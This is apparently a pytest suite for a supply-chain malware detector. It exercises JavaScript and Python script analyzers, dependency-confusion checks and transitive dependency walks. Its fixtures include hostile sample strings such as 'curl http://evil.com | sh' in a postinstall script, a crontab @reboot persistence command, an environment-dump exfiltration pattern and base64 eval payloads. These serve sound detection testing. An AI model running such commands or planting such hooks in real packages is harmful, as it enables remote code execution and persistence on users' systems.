"""Tests for Plan 03: Supply Chain Detection Depth."""

from __future__ import annotations

import json
from unittest.mock import MagicMock

from policy_scout.supply_chain.js_analyzer import (
    JSAnalyzer,
    ScriptFinding,
    strip_js_comments,
    decode_base64_literals,
    _apply_escalation,
    _is_minified,
)
from policy_scout.supply_chain.py_analyzer import analyze_python_script
from policy_scout.supply_chain.dep_confusion import check_dependency_confusion
from policy_scout.supply_chain.transitive import analyze_tree
from policy_scout.supply_chain import analyze_lifecycle_scripts
from policy_scout.sandbox.models import LifecycleScript


# ─── JSAnalyzer ──────────────────────────────────────────────────────────────


class TestStripJsComments:
    def test_single_line_comment_removed(self):
        result = strip_js_comments("var x = 1; // this is a comment\nvar y = 2;")
        assert "this is a comment" not in result
        assert "var y = 2" in result

    def test_multi_line_comment_removed(self):
        result = strip_js_comments("/* header */\nvar x = 1;")
        assert "header" not in result
        assert "var x = 1" in result

    def test_url_not_stripped(self):
        result = strip_js_comments('var url = "https://example.com";')
        assert "https://example.com" in result

    def test_inline_multi_line_comment_removed(self):
        result = strip_js_comments("var x = /* evil */ 1;")
        assert "evil" not in result
        assert "var x" in result


class TestDecodeBase64Literals:
    def test_buffer_from_decoded(self):
        import base64
        # payload must encode to 20+ alphanumeric base64 chars (the regex minimum)
        raw = b"evil_code() exec shell steal all data here"
        payload = base64.b64encode(raw).decode()
        source = f'Buffer.from("{payload}", "base64")'
        result = decode_base64_literals(source)
        assert raw.decode() in result

    def test_atob_decoded(self):
        import base64
        raw = b"steal_creds() send to attacker server"
        payload = base64.b64encode(raw).decode()
        source = f"atob('{payload}')"
        result = decode_base64_literals(source)
        assert raw.decode() in result

    def test_non_base64_unchanged(self):
        source = "var x = 'hello world';"
        assert decode_base64_literals(source) == source

    def test_depth_limit_respected(self):
        # Should not infinitely recurse
        source = "Buffer.from('aGVsbG8=', 'base64')"
        result = decode_base64_literals(source)
        assert isinstance(result, str)


class TestIsMinified:
    def test_short_lines_not_minified(self):
        source = "var x = 1;\nvar y = 2;\nvar z = 3;"
        assert _is_minified(source) is False

    def test_very_long_lines_are_minified(self):
        long_line = "var x=" + "a" * 300 + ";"
        source = "\n".join([long_line, long_line, long_line])
        assert _is_minified(source) is True

    def test_few_lines_not_flagged(self):
        source = "x" * 300
        assert _is_minified(source) is False


class TestJSAnalyzerPatterns:
    def setup_method(self):
        self.analyzer = JSAnalyzer()

    def test_shell_exec_detected(self):
        source = "require('child_process').execSync('curl http://evil.com | sh')"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        assert "shell_exec" in ids

    def test_network_fetch_detected(self):
        source = "const http = require('https'); http.request({hostname: 'evil.com'}, cb);"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        assert "network_fetch" in ids

    def test_indirect_eval_detected(self):
        source = "var fn = new Function('return process.env');"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        assert "indirect_eval" in ids

    def test_env_exfiltration_detected(self):
        source = "JSON.stringify(process.env);"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        assert "env_exfiltration" in ids

    def test_file_write_sensitive_detected(self):
        # crontab pattern: \bcrontab\b is in file_write_sensitive patterns
        source = "require('child_process').execSync('(crontab -l; echo \"@reboot evil\") | crontab -');"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        assert "file_write_sensitive" in ids

    def test_conditional_activation_detected(self):
        source = "if (process.env.CI) { doEvil(); }"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        assert "conditional_activation" in ids

    def test_clean_script_no_findings(self):
        source = "console.log('hello world');"
        findings = self.analyzer.analyze(source)
        assert findings == []

    def test_base64_payload_decoded_and_detected(self):
        import base64
        inner = "require('child_process').execSync('id')"
        encoded = base64.b64encode(inner.encode()).decode()
        source = f"eval(Buffer.from('{encoded}', 'base64').toString())"
        findings = self.analyzer.analyze(source)
        ids = [f.pattern_id for f in findings]
        # After decoding, shell_exec or indirect_eval should fire
        assert any(pid in ids for pid in ("shell_exec", "indirect_eval", "encoded_payload"))

    def test_finding_has_required_fields(self):
        source = "require('child_process').execSync('id')"
        findings = self.analyzer.analyze(source)
        assert findings
        f = findings[0]
        assert f.severity in ("critical", "high", "medium", "low")
        assert f.confidence in ("high", "medium", "low")
        assert f.line_number >= 1
        assert f.pattern_id

    def test_to_dict_serializable(self):
        source = "require('child_process').execSync('id')"
        findings = self.analyzer.analyze(source)
        assert findings
        d = findings[0].to_dict()
        json.dumps(d)  # must not raise
        assert d["type"] == "supply_chain"


class TestEscalationRules:
    def test_ci_conditional_network_escalated(self):
        findings = [
            ScriptFinding("conditional_activation", "CI check", "medium", "low", "CI", 1),
            ScriptFinding("network_fetch", "HTTP req", "high", "high", "fetch()", 2),
        ]
        result = _apply_escalation(findings)
        severities = {f.pattern_id: f.severity for f in result}
        assert severities["conditional_activation"] == "critical"
        assert severities["network_fetch"] == "critical"

    def test_eval_with_encoded_payload_escalated(self):
        findings = [
            ScriptFinding("indirect_eval", "eval", "high", "medium", "eval()", 1),
            ScriptFinding("encoded_payload", "b64", "high", "medium", "Buffer.from(", 2),
        ]
        result = _apply_escalation(findings)
        assert all(f.severity == "critical" for f in result)
        assert all(f.escalated for f in result)

    def test_no_escalation_single_pattern(self):
        findings = [
            ScriptFinding("conditional_activation", "CI", "medium", "low", "CI", 1),
        ]
        result = _apply_escalation(findings)
        assert result[0].severity == "medium"
        assert result[0].escalated is False


# ─── Python AST Analyzer ─────────────────────────────────────────────────────


class TestPyAnalyzer:
    def test_subprocess_call_detected(self):
        source = "import subprocess\nsubprocess.run(['id'], shell=True)"
        findings = analyze_python_script(source)
        types = [f.node_type for f in findings]
        assert "py_dangerous_import" in types

    def test_eval_detected(self):
        source = "code = input()\neval(code)"
        findings = analyze_python_script(source)
        types = [f.node_type for f in findings]
        assert "py_dynamic_exec" in types

    def test_exec_detected(self):
        source = "exec('import os; os.system(\"id\")')"
        findings = analyze_python_script(source)
        types = [f.node_type for f in findings]
        assert "py_dynamic_exec" in types

    def test_network_import_flagged(self):
        source = "import requests\nrequests.get('http://evil.com')"
        findings = analyze_python_script(source)
        types = [f.node_type for f in findings]
        assert "py_dangerous_import" in types

    def test_clean_setup_no_findings(self):
        source = (
            "from setuptools import setup\n"
            "setup(name='mypkg', version='1.0', packages=['mypkg'])"
        )
        findings = analyze_python_script(source)
        assert findings == []

    def test_syntax_error_falls_back_to_text(self):
        # This is not valid Python but should not raise
        source = "this is not valid python !@#$"
        findings = analyze_python_script(source)
        assert isinstance(findings, list)

    def test_finding_has_required_fields(self):
        source = "import subprocess\nsubprocess.run(['id'])"
        findings = analyze_python_script(source)
        assert findings
        f = findings[0]
        assert f.line_number >= 1
        assert f.severity in ("critical", "high", "medium", "low")

    def test_to_dict_serializable(self):
        source = "import subprocess\nsubprocess.run(['id'])"
        findings = analyze_python_script(source)
        assert findings
        d = findings[0].to_dict()
        json.dumps(d)
        assert d["type"] == "supply_chain"
        assert d["source"] == "py_analyzer"


# ─── Dependency Confusion ────────────────────────────────────────────────────


class TestDependencyConfusion:
    def test_internal_keyword_flagged(self):
        result = check_dependency_confusion("my-internal-utils", "npm")
        assert result.suspicious is True
        assert any("internal" in r for r in result.reasons)

    def test_private_keyword_flagged(self):
        result = check_dependency_confusion("acme-private-sdk", "npm")
        assert result.suspicious is True

    def test_known_public_scope_not_flagged(self):
        result = check_dependency_confusion("@types/node", "npm")
        # @types is a known public scope
        assert not any("scope" in r for r in result.reasons)

    def test_clean_package_not_flagged(self):
        result = check_dependency_confusion("lodash", "npm")
        assert result.suspicious is False

    def test_to_dict_structure(self):
        result = check_dependency_confusion("my-corp-lib", "npm")
        d = result.to_dict()
        json.dumps(d)
        assert d["type"] == "supply_chain"
        assert d["pattern_id"] == "dependency_confusion"

    def test_severity_scales_with_reason_count(self):
        # Multiple signals → higher severity
        result = check_dependency_confusion("my-private-internal-corp-sdk", "npm")
        if result.suspicious:
            assert result.severity in ("medium", "high")


# ─── Transitive Analysis ─────────────────────────────────────────────────────


FIXTURE_NPM_TREE = {
    "name": "my-project",
    "version": "1.0.0",
    "dependencies": {
        "lodash": {"version": "4.17.21", "dependencies": {}},
        "evil-pkg": {"version": "1.0.0", "dependencies": {
            "nested-evil": {"version": "0.1.0", "dependencies": {}}
        }},
    }
}


class TestTransitiveAnalysis:
    def test_walks_all_packages(self):
        result = analyze_tree(FIXTURE_NPM_TREE, ecosystem="npm", intel_adapter=None)
        assert result.package_count == 3
        assert result.max_depth == 2

    def test_no_intel_adapter_produces_no_findings(self):
        result = analyze_tree(FIXTURE_NPM_TREE, ecosystem="npm", intel_adapter=None)
        assert result.findings == []

    def test_intel_hit_produces_finding(self):
        mock_intel = MagicMock()
        mock_result = MagicMock()
        mock_result.has_findings = True
        mock_result.top_severity.return_value = "critical"
        mock_result.confidence = "high"
        mock_result.to_dict.return_value = {"known_bad": True}
        mock_intel.enrich_package.return_value = mock_result

        result = analyze_tree(FIXTURE_NPM_TREE, ecosystem="npm", intel_adapter=mock_intel)
        assert len(result.findings) > 0
        assert result.findings[0]["severity"] == "critical"
        assert result.findings[0]["source"] == "transitive_analysis"

    def test_deduplication_prevents_cycles(self):
        # Same package at multiple tree positions should be visited once
        cyclic_tree = {
            "dependencies": {
                "pkg-a": {"version": "1.0.0", "dependencies": {
                    "pkg-b": {"version": "1.0.0", "dependencies": {}}
                }},
                "pkg-b": {"version": "1.0.0", "dependencies": {}},
            }
        }
        result = analyze_tree(cyclic_tree, intel_adapter=None)
        assert result.package_count == 2

    def test_to_dict_serializable(self):
        result = analyze_tree(FIXTURE_NPM_TREE, intel_adapter=None)
        json.dumps(result.to_dict())

    def test_empty_tree_returns_zero_counts(self):
        result = analyze_tree({}, intel_adapter=None)
        assert result.package_count == 0
        assert result.findings == []


# ─── analyze_lifecycle_scripts integration ───────────────────────────────────


class TestAnalyzeLifecycleScripts:
    def test_js_script_analyzed(self):
        scripts = [LifecycleScript(
            package_name="evil-pkg",
            script_name="postinstall",
            script_content="require('child_process').execSync('curl http://evil.com | sh')",
            location="/path/to/package.json",
        )]
        findings = analyze_lifecycle_scripts(scripts)
        assert len(findings) > 0
        assert all(f["type"] == "supply_chain" for f in findings)
        assert all(f["package_name"] == "evil-pkg" for f in findings)

    def test_clean_script_no_findings(self):
        scripts = [LifecycleScript(
            package_name="safe-pkg",
            script_name="postinstall",
            script_content="echo 'installation complete'",
            location="/path/to/package.json",
        )]
        findings = analyze_lifecycle_scripts(scripts)
        assert findings == []

    def test_multiple_scripts_all_analyzed(self):
        scripts = [
            LifecycleScript("pkg-a", "postinstall",
                            "require('https').request({hostname:'evil.com'})", "/a"),
            LifecycleScript("pkg-b", "install",
                            "var fn = new Function('return 1')", "/b"),
        ]
        findings = analyze_lifecycle_scripts(scripts)
        pkgs = {f["package_name"] for f in findings}
        assert "pkg-a" in pkgs
        assert "pkg-b" in pkgs

    def test_findings_include_script_name(self):
        scripts = [LifecycleScript(
            package_name="pkg",
            script_name="postinstall",
            script_content="eval(Buffer.from('ZXZpbCgp', 'base64').toString())",
            location="/path",
        )]
        findings = analyze_lifecycle_scripts(scripts)
        for f in findings:
            assert "script_name" in f
            assert f["script_name"] == "postinstall"
